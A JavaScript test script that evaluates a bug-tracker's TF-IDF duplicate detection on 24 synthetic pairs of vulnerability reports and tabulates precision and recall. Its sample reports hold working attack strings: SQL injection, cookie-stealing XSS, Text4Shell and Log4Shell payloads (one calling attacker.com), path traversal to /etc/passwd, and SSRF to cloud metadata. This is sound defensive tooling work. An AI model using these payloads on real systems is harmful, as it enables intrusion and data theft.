/**
 * VulnTrack Duplicate Detection Validation Experiment
 *
 * Evaluates the TF-IDF / Cosine Similarity duplicate detection engine across
 * multiple threshold values (0.60, 0.70, 0.75, 0.80).
 *
 * Dataset: 24 synthetic paired report scenarios (12 True Duplicate pairs,
 * 12 True Negative / Distinct vulnerability pairs).
 * Generated to represent realistic variations in security reporting phrasing,
 * terminology, CWE classification, and identifier overlap.
 */

const fs = require('fs');
const path = require('path');

// We directly load DuplicateService from the backend
const DuplicateService = require(path.resolve(__dirname, '../../backend/src/services/duplicate.service'));

// Labeled Synthetic Evaluation Dataset
const evaluationDataset = [
  // ==================== TRUE DUPLICATES (12 Pairs) ====================
  {
    id: 'PAIR-TD-01',
    isDuplicate: true,
    description: 'SQL Injection in /api/v1/users/login parameter email',
    reportA: {
      title: 'SQL injection flaw in user login endpoint',
      description: 'The email field in the authentication endpoint is vulnerable to SQL injection using single quotes.',
      stepsToReproduce: 'Send POST request to /api/v1/users/login with payload admin\' or 1=1--',
      category: 'SQL Injection',
      cveId: 'CVE-2023-99991',
      cweId: 'CWE-89'
    },
    reportB: {
      title: 'Authentication bypass via SQLi in email parameter',
      description: 'An attacker can inject arbitrary SQL commands during login via the email field leading to auth bypass.',
      stepsToReproduce: 'Craft HTTP POST payload with admin\'-- on /api/v1/users/login',
      category: 'SQL Injection',
      cveId: 'CVE-2023-99991',
      cweId: 'CWE-89'
    }
  },
  {
    id: 'PAIR-TD-02',
    isDuplicate: true,
    description: 'Reflected Cross-Site Scripting (XSS) in search query',
    reportA: {
      title: 'Reflected XSS on products search bar',
      description: 'User input in the search query parameter q is echoed back without HTML entity encoding.',
      stepsToReproduce: 'Navigate to /search?q=<script>alert(1)</script>',
      category: 'XSS',
      cweId: 'CWE-79'
    },
    reportB: {
      title: 'Cross-site scripting vulnerability in catalog search',
      description: 'Search parameter q reflects unescaped Javascript payload into the browser DOM.',
      stepsToReproduce: 'Submit search box with payload <img src=x onerror=alert(document.cookie)>',
      category: 'XSS',
      cweId: 'CWE-79'
    }
  },
  {
    id: 'PAIR-TD-03',
    isDuplicate: true,
    description: 'Remote Code Execution via Apache Commons Text template injection',
    reportA: {
      title: 'RCE via Apache Commons Text (Text4Shell)',
      description: 'Vulnerable Apache Commons Text library permits string interpolation and arbitrary code execution.',
      stepsToReproduce: 'Send prefix ${script:javascript:java.lang.Runtime.getRuntime().exec("id")}',
      category: 'RCE',
      cveId: 'CVE-2022-42889',
      cweId: 'CWE-94'
    },
    reportB: {
      title: 'Remote command execution in text interpolation engine',
      description: 'String lookup interpolation in commons-text enables arbitrary server command execution.',
      stepsToReproduce: 'Inject malicious string lookup ${script:javascript:...} in HTTP header',
      category: 'RCE',
      cveId: 'CVE-2022-42889',
      cweId: 'CWE-94'
    }
  },
  {
    id: 'PAIR-TD-04',
    isDuplicate: true,
    description: 'Server-Side Request Forgery (SSRF) in webhook URL validator',
    reportA: {
      title: 'Blind SSRF in outbound webhook delivery',
      description: 'Webhook registration accepts arbitrary intranet IP addresses and reaches cloud metadata endpoint.',
      stepsToReproduce: 'Add webhook URL http://169.254.169.254/latest/meta-data/',
      category: 'SSRF',
      cweId: 'CWE-918'
    },
    reportB: {
      title: 'Server side request forgery via webhook integration',
      description: 'Application server can be forced to query internal services by providing internal IP in webhook URL.',
      stepsToReproduce: 'Configure webhook target to internal AWS metadata server address 169.254.169.254',
      category: 'SSRF',
      cweId: 'CWE-918'
    }
  },
  {
    id: 'PAIR-TD-05',
    isDuplicate: true,
    description: 'IDOR in customer billing invoice download',
    reportA: {
      title: 'Insecure Direct Object Reference on invoice PDF endpoint',
      description: 'Changing invoiceId parameter in /api/v1/invoices/:id downloads other tenants private billing records.',
      stepsToReproduce: 'GET /api/v1/invoices/10023 as user 10045',
      category: 'IDOR',
      cweId: 'CWE-639'
    },
    reportB: {
      title: 'Unauthorized invoice access via IDOR',
      description: 'Lack of tenant authorization verification allows downloading any invoice by guessing sequential IDs.',
      stepsToReproduce: 'Access /api/v1/invoices/{id} while authenticated as an unrelated user',
      category: 'IDOR',
      cweId: 'CWE-639'
    }
  },
  {
    id: 'PAIR-TD-06',
    isDuplicate: true,
    description: 'Path Traversal arbitrary file read in document viewer',
    reportA: {
      title: 'Directory traversal allows reading /etc/passwd',
      description: 'Document viewer download servlet does not sanitize dot-dot-slash sequence in filepath parameter.',
      stepsToReproduce: 'GET /view?file=../../../../etc/passwd',
      category: 'Info Disclosure',
      cweId: 'CWE-22'
    },
    reportB: {
      title: 'Arbitrary file disclosure through path traversal in doc viewer',
      description: 'Input parameter file in doc preview allows directory traversal to retrieve sensitive server files.',
      stepsToReproduce: 'Request /view?file=..%2F..%2F..%2Fetc%2Fpasswd',
      category: 'Info Disclosure',
      cweId: 'CWE-22'
    }
  },
  {
    id: 'PAIR-TD-07',
    isDuplicate: true,
    description: 'Missing CSRF token on email change endpoint',
    reportA: {
      title: 'Cross-Site Request Forgery on profile email update',
      description: 'No CSRF validation token is verified when submitting form to /user/settings/email.',
      stepsToReproduce: 'Submit auto-submitting HTML form from external domain targeting /user/settings/email',
      category: 'CSRF',
      cweId: 'CWE-352'
    },
    reportB: {
      title: 'Account takeover via CSRF in email modification',
      description: 'The POST request updating user contact email lacks Anti-CSRF protection tokens.',
      stepsToReproduce: 'Lure logged in user to click malicious webpage that triggers POST to /user/settings/email',
      category: 'CSRF',
      cweId: 'CWE-352'
    }
  },
  {
    id: 'PAIR-TD-08',
    isDuplicate: true,
    description: 'Unrestricted file upload leading to web shell execution',
    reportA: {
      title: 'Arbitrary file upload leads to RCE in avatar upload',
      description: 'Profile avatar upload endpoint does not check file extension or magic bytes allowing php shell upload.',
      stepsToReproduce: 'Upload webshell.php with Content-Type image/png to /api/profile/avatar',
      category: 'RCE',
      cweId: 'CWE-434'
    },
    reportB: {
      title: 'Web shell upload through user avatar picture feature',
      description: 'Attacker can upload PHP scripts via profile photo upload and execute commands on host.',
      stepsToReproduce: 'POST webshell payload to avatar upload route and request the uploaded file URL',
      category: 'RCE',
      cweId: 'CWE-434'
    }
  },
  {
    id: 'PAIR-TD-09',
    isDuplicate: true,
    description: 'Spring4Shell DataBinder parameter binding RCE',
    reportA: {
      title: 'Spring Framework Remote Code Execution (Spring4Shell)',
      description: 'Vulnerability in Spring Framework allows access to ClassLoader via DataBinder parameter binding.',
      stepsToReproduce: 'Send HTTP POST with class.module.classLoader parameters to write malicious jsp',
      category: 'RCE',
      cveId: 'CVE-2022-22965',
      cweId: 'CWE-94'
    },
    reportB: {
      title: 'ClassLoader injection RCE in Spring Framework applications',
      description: 'Spring MVC data binding enables remote attackers to manipulate ClassLoader properties.',
      stepsToReproduce: 'POST crafted query string binding ClassLoader to write web shell',
      category: 'RCE',
      cveId: 'CVE-2022-22965',
      cweId: 'CWE-94'
    }
  },
  {
    id: 'PAIR-TD-10',
    isDuplicate: true,
    description: 'Broken JWT token validation allows signature stripping',
    reportA: {
      title: 'JWT none algorithm authentication bypass',
      description: 'API authentication accepts JSON Web Tokens with alg none and invalid signature.',
      stepsToReproduce: 'Change header to {"alg":"none"} and remove signature from Bearer token',
      category: 'Auth Bypass',
      cweId: 'CWE-287'
    },
    reportB: {
      title: 'Authentication bypass via unsigned JWT with alg none',
      description: 'Server verifies JWT tokens incorrectly by allowing unsigned tokens using none algorithm.',
      stepsToReproduce: 'Forge admin token with none algorithm and authenticate against protected API',
      category: 'Auth Bypass',
      cweId: 'CWE-287'
    }
  },
  {
    id: 'PAIR-TD-11',
    isDuplicate: true,
    description: 'CORS Wildcard with Credentials Misconfiguration',
    reportA: {
      title: 'Insecure CORS policy with wildcard origin and credentials enabled',
      description: 'Server echoes back Origin header with Access-Control-Allow-Credentials: true allowing cross-origin data theft.',
      stepsToReproduce: 'Send Origin: https://evil.com and inspect CORS response headers',
      category: 'Misconfiguration',
      cweId: 'CWE-942'
    },
    reportB: {
      title: 'Cross-origin resource sharing misconfiguration allows credentialed theft',
      description: 'Arbitrary origin reflection in CORS response headers permits malicious sites to read private responses.',
      stepsToReproduce: 'Perform cross-origin fetch request from third-party domain and verify credentialed response',
      category: 'Misconfiguration',
      cweId: 'CWE-942'
    }
  },
  {
    id: 'PAIR-TD-12',
    isDuplicate: true,
    description: 'Hardcoded JWT Secret key in application configuration',
    reportA: {
      title: 'Hardcoded HMAC secret in source repository',
      description: 'The secret string "supersecretkey123" is hardcoded in auth.config.js allowing token forgery.',
      stepsToReproduce: 'Sign arbitrary JWT using secret key supersecretkey123 and access admin route',
      category: 'Misconfiguration',
      cweId: 'CWE-798'
    },
    reportB: {
      title: 'Use of default hardcoded cryptographic key for token signing',
      description: 'JWT signing secret is statically defined in source code, enabling offline token generation.',
      stepsToReproduce: 'Generate forged JWT token using discovered hardcoded key supersecretkey123',
      category: 'Misconfiguration',
      cweId: 'CWE-798'
    }
  },

  // ==================== TRUE NEGATIVES / DISTINCT REPORTS (12 Pairs) ====================
  {
    id: 'PAIR-TN-01',
    isDuplicate: false,
    description: 'SQLi in Login vs SQLi in Reporting Export (Different endpoint and table)',
    reportA: {
      title: 'SQL injection flaw in user login endpoint',
      description: 'The email field in the authentication endpoint is vulnerable to SQL injection using single quotes.',
      stepsToReproduce: 'Send POST request to /api/v1/users/login with payload admin\' or 1=1--',
      category: 'SQL Injection',
      cweId: 'CWE-89'
    },
    reportB: {
      title: 'SQL injection in analytics export date filter',
      description: 'Export endpoint /api/v1/analytics/export concatenates dateRange parameter into dynamic query.',
      stepsToReproduce: 'GET /api/v1/analytics/export?startDate=2023-01-01\';WAITFOR+DELAY+\'0:0:5\'--',
      category: 'SQL Injection',
      cweId: 'CWE-89'
    }
  },
  {
    id: 'PAIR-TN-02',
    isDuplicate: false,
    description: 'Reflected XSS in search vs Stored XSS in user profile comments',
    reportA: {
      title: 'Reflected XSS on products search bar',
      description: 'User input in the search query parameter q is echoed back without HTML entity encoding.',
      stepsToReproduce: 'Navigate to /search?q=<script>alert(1)</script>',
      category: 'XSS',
      cweId: 'CWE-79'
    },
    reportB: {
      title: 'Stored XSS in user profile biography field',
      description: 'Bio field in profile editor saves unescaped HTML which renders persistently to all visiting users.',
      stepsToReproduce: 'Save bio containing <script>fetch("/steal?c="+document.cookie)</script>',
      category: 'XSS',
      cweId: 'CWE-79'
    }
  },
  {
    id: 'PAIR-TN-03',
    isDuplicate: false,
    description: 'Apache Commons Text RCE vs Log4j JNDI RCE',
    reportA: {
      title: 'RCE via Apache Commons Text (Text4Shell)',
      description: 'Vulnerable Apache Commons Text library permits string interpolation and arbitrary code execution.',
      stepsToReproduce: 'Send prefix ${script:javascript:java.lang.Runtime.getRuntime().exec("id")}',
      category: 'RCE',
      cveId: 'CVE-2022-42889',
      cweId: 'CWE-94'
    },
    reportB: {
      title: 'Remote code execution via Log4j JNDI lookup (Log4Shell)',
      description: 'Log4j core message lookup substitution parses malicious LDAP URLs triggering arbitrary class loading.',
      stepsToReproduce: 'Send header X-Api-Version: ${jndi:ldap://attacker.com/exploit}',
      category: 'RCE',
      cveId: 'CVE-2021-44228',
      cweId: 'CWE-502'
    }
  },
  {
    id: 'PAIR-TN-04',
    isDuplicate: false,
    description: 'SSRF via Webhook vs Open Redirect via login returnUrl',
    reportA: {
      title: 'Blind SSRF in outbound webhook delivery',
      description: 'Webhook registration accepts arbitrary intranet IP addresses and reaches cloud metadata endpoint.',
      stepsToReproduce: 'Add webhook URL http://169.254.169.254/latest/meta-data/',
      category: 'SSRF',
      cweId: 'CWE-918'
    },
    reportB: {
      title: 'Open redirect vulnerability on post-login redirect',
      description: 'Parameter redirectUrl on authentication screen does not validate destination domain.',
      stepsToReproduce: 'Navigate to /login?redirectUrl=https://evil-phishing.com',
      category: 'Auth Bypass',
      cweId: 'CWE-601'
    }
  },
  {
    id: 'PAIR-TN-05',
    isDuplicate: false,
    description: 'IDOR in Invoices vs IDOR in Password Reset Token Retrieval',
    reportA: {
      title: 'Insecure Direct Object Reference on invoice PDF endpoint',
      description: 'Changing invoiceId parameter in /api/v1/invoices/:id downloads other tenants private billing records.',
      stepsToReproduce: 'GET /api/v1/invoices/10023 as user 10045',
      category: 'IDOR',
      cweId: 'CWE-639'
    },
    reportB: {
      title: 'IDOR in user address book deletion endpoint',
      description: 'Address book DELETE endpoint /api/user/address/:id deletes any users address without ownership check.',
      stepsToReproduce: 'DELETE /api/user/address/8892 as unauthorized customer',
      category: 'IDOR',
      cweId: 'CWE-639'
    }
  },
  {
    id: 'PAIR-TN-06',
    isDuplicate: false,
    description: 'Path Traversal in doc viewer vs Directory Listing enabled on Nginx',
    reportA: {
      title: 'Directory traversal allows reading /etc/passwd',
      description: 'Document viewer download servlet does not sanitize dot-dot-slash sequence in filepath parameter.',
      stepsToReproduce: 'GET /view?file=../../../../etc/passwd',
      category: 'Info Disclosure',
      cweId: 'CWE-22'
    },
    reportB: {
      title: 'Web server directory indexing enabled on static uploads folder',
      description: 'Web server returns automatic directory index listing when browsing /uploads directory.',
      stepsToReproduce: 'Browse to http://example.com/uploads/ and observe directory tree listing',
      category: 'Misconfiguration',
      cweId: 'CWE-548'
    }
  },
  {
    id: 'PAIR-TN-07',
    isDuplicate: false,
    description: 'CSRF on email change vs Rate Limiting missing on Login',
    reportA: {
      title: 'Cross-Site Request Forgery on profile email update',
      description: 'No CSRF validation token is verified when submitting form to /user/settings/email.',
      stepsToReproduce: 'Submit auto-submitting HTML form from external domain targeting /user/settings/email',
      category: 'CSRF',
      cweId: 'CWE-352'
    },
    reportB: {
      title: 'Lack of brute force rate limiting on login endpoint',
      description: 'Endpoint /api/v1/auth/login allows unlimited password attempts without lockouts or CAPTCHA.',
      stepsToReproduce: 'Send 500 POST requests in 10 seconds using Hydra or Burp Intruder',
      category: 'Auth Bypass',
      cweId: 'CWE-307'
    }
  },
  {
    id: 'PAIR-TN-08',
    isDuplicate: false,
    description: 'Avatar webshell upload vs CSV formula injection export',
    reportA: {
      title: 'Arbitrary file upload leads to RCE in avatar upload',
      description: 'Profile avatar upload endpoint does not check file extension or magic bytes allowing php shell upload.',
      stepsToReproduce: 'Upload webshell.php with Content-Type image/png to /api/profile/avatar',
      category: 'RCE',
      cweId: 'CWE-434'
    },
    reportB: {
      title: 'CSV Formula Injection in customer report download',
      description: 'Customer names starting with = or @ trigger command execution when opened in Microsoft Excel.',
      stepsToReproduce: 'Register user named =cmd|\'/C calc\'!A0 and export customer list CSV',
      category: 'Info Disclosure',
      cweId: 'CWE-1236'
    }
  },
  {
    id: 'PAIR-TN-09',
    isDuplicate: false,
    description: 'Spring4Shell RCE vs Outdated jQuery Library',
    reportA: {
      title: 'Spring Framework Remote Code Execution (Spring4Shell)',
      description: 'Vulnerability in Spring Framework allows access to ClassLoader via DataBinder parameter binding.',
      stepsToReproduce: 'Send HTTP POST with class.module.classLoader parameters to write malicious jsp',
      category: 'RCE',
      cveId: 'CVE-2022-22965',
      cweId: 'CWE-94'
    },
    reportB: {
      title: 'Outdated jQuery library version 1.12.4 vulnerable to prototype pollution',
      description: 'Frontend bundle includes vulnerable legacy jQuery library version susceptible to XSS.',
      stepsToReproduce: 'Inspect script source tag in index.html loading jquery-1.12.4.min.js',
      category: 'Other',
      cveId: 'CVE-2019-11358',
      cweId: 'CWE-1321'
    }
  },
  {
    id: 'PAIR-TN-10',
    isDuplicate: false,
    description: 'JWT none algorithm bypass vs Session fixation in web cookie',
    reportA: {
      title: 'JWT none algorithm authentication bypass',
      description: 'API authentication accepts JSON Web Tokens with alg none and invalid signature.',
      stepsToReproduce: 'Change header to {"alg":"none"} and remove signature from Bearer token',
      category: 'Auth Bypass',
      cweId: 'CWE-287'
    },
    reportB: {
      title: 'Session fixation on user login preserves pre-authentication cookie',
      description: 'Application session ID remains identical before and after successful login verification.',
      stepsToReproduce: 'Note JSESSIONID cookie before login, authenticate, and verify session identifier is unchanged',
      category: 'Auth Bypass',
      cweId: 'CWE-384'
    }
  },
  {
    id: 'PAIR-TN-11',
    isDuplicate: false,
    description: 'CORS wildcard with credentials vs Missing Content-Security-Policy',
    reportA: {
      title: 'Insecure CORS policy with wildcard origin and credentials enabled',
      description: 'Server echoes back Origin header with Access-Control-Allow-Credentials: true allowing cross-origin data theft.',
      stepsToReproduce: 'Send Origin: https://evil.com and inspect CORS response headers',
      category: 'Misconfiguration',
      cweId: 'CWE-942'
    },
    reportB: {
      title: 'Missing Content-Security-Policy (CSP) response header',
      description: 'Web application fails to set Content-Security-Policy header to prevent untrusted script execution.',
      stepsToReproduce: 'Curl web server response headers and verify absence of Content-Security-Policy header',
      category: 'Misconfiguration',
      cweId: 'CWE-693'
    }
  },
  {
    id: 'PAIR-TN-12',
    isDuplicate: false,
    description: 'Hardcoded JWT Secret vs Default SSH Root Password on VM image',
    reportA: {
      title: 'Hardcoded HMAC secret in source repository',
      description: 'The secret string "supersecretkey123" is hardcoded in auth.config.js allowing token forgery.',
      stepsToReproduce: 'Sign arbitrary JWT using secret key supersecretkey123 and access admin route',
      category: 'Misconfiguration',
      cweId: 'CWE-798'
    },
    reportB: {
      title: 'Default vendor credentials enabled on internal Redis server',
      description: 'Redis cache deployed without requirepass directive allows unauthenticated command execution.',
      stepsToReproduce: 'Run redis-cli -h 10.0.0.15 INFO and verify unauthenticated access is permitted',
      category: 'Misconfiguration',
      cweId: 'CWE-287'
    }
  }
];

// Evaluate across threshold values
const thresholds = [0.60, 0.70, 0.75, 0.80];

console.log('Evaluating Duplicate Detection Service across thresholds...');

const pairScores = evaluationDataset.map(item => {
  const score = DuplicateService.computeScore(item.reportA, item.reportB);
  return {
    id: item.id,
    isDuplicate: item.isDuplicate,
    description: item.description,
    score
  };
});

const evaluationResults = thresholds.map(t => {
  let tp = 0; // True Positive: isDuplicate=true and score >= t
  let fp = 0; // False Positive: isDuplicate=false and score >= t
  let tn = 0; // True Negative: isDuplicate=false and score < t
  let fn = 0; // False Negative: isDuplicate=true and score < t

  pairScores.forEach(p => {
    const predicted = p.score >= t;
    if (p.isDuplicate && predicted) tp++;
    else if (!p.isDuplicate && predicted) fp++;
    else if (!p.isDuplicate && !predicted) tn++;
    else if (p.isDuplicate && !predicted) fn++;
  });

  const precision = tp + fp > 0 ? tp / (tp + fp) : 1.0;
  const recall = tp + fn > 0 ? tp / (tp + fn) : 0.0;
  const f1 = precision + recall > 0 ? (2 * precision * recall) / (precision + recall) : 0.0;
  const accuracy = (tp + tn) / (tp + tn + fp + fn);

  return {
    threshold: t,
    tp,
    fp,
    tn,
    fn,
    precision: Math.round(precision * 1000) / 1000,
    recall: Math.round(recall * 1000) / 1000,
    f1: Math.round(f1 * 1000) / 1000,
    accuracy: Math.round(accuracy * 1000) / 1000
  };
});

// Output formatted results
const outJson = path.resolve(__dirname, '../evidence/duplicate_experiment_results.json');
const outTxt = path.resolve(__dirname, '../evidence/duplicate_experiment_table.txt');

fs.writeFileSync(outJson, JSON.stringify({ pairScores, evaluationResults }, null, 2));

let tableStr = '='.repeat(85) + '\n';
tableStr += 'VULNTRACK DUPLICATE DETECTION PERFORMANCE ACROSS SIMILARITY THRESHOLDS\n';
tableStr += 'Dataset: 24 Synthetic Pairs (12 True Duplicates, 12 True Negatives)\n';
tableStr += '='.repeat(85) + '\n';
tableStr += [
  'Threshold'.padEnd(12),
  'TP'.padEnd(6),
  'FP'.padEnd(6),
  'TN'.padEnd(6),
  'FN'.padEnd(6),
  'Precision'.padEnd(12),
  'Recall'.padEnd(12),
  'F1-Score'.padEnd(12),
  'Accuracy'.padEnd(10)
].join(' ') + '\n';
tableStr += '-'.repeat(85) + '\n';

evaluationResults.forEach(r => {
  tableStr += [
    r.threshold.toFixed(2).padEnd(12),
    String(r.tp).padEnd(6),
    String(r.fp).padEnd(6),
    String(r.tn).padEnd(6),
    String(r.fn).padEnd(6),
    r.precision.toFixed(3).padEnd(12),
    r.recall.toFixed(3).padEnd(12),
    r.f1.toFixed(3).padEnd(12),
    r.accuracy.toFixed(3).padEnd(10)
  ].join(' ') + '\n';
});
tableStr += '='.repeat(85) + '\n\n';

tableStr += 'DETAILED PAIR SCORES:\n';
tableStr += '-'.repeat(85) + '\n';
pairScores.forEach(p => {
  tableStr += `${p.id} [${p.isDuplicate ? 'TRUE DUP' : 'DISTINCT'}]: Score = ${p.score.toFixed(2)} | ${p.description}\n`;
});

fs.writeFileSync(outTxt, tableStr);
console.log(tableStr);
console.log(`Results saved to ${outJson} and ${outTxt}`);
